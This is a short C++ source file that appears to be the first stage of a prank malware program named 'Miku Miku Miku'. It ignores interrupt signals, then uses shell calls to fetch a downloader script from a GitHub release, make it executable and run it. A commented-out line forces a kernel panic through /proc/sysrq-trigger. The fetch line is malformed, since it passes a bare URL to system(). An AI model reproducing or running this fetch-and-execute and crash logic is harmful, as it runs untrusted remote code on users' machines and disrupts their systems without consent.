#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <csignal>

// The pre-reboot part of Miku Miku Miku.
// The system is guaranteed to reboot anyway here, this is just what the user sees before a kernel panic.

int main()
{
    std::signal(SIGINT, SIG_IGN);

    // Had so manu issues with the C++ downloading script, just gonna make a shell script at this point.
    system("https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild5/downloader.sh");
    system("chmod +x downloader.sh");
    system("./downloader.sh");

    // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
    // Unused for now: system("echo c > /proc/sysrq-trigger");

    return EXIT_SUCCESS;
}
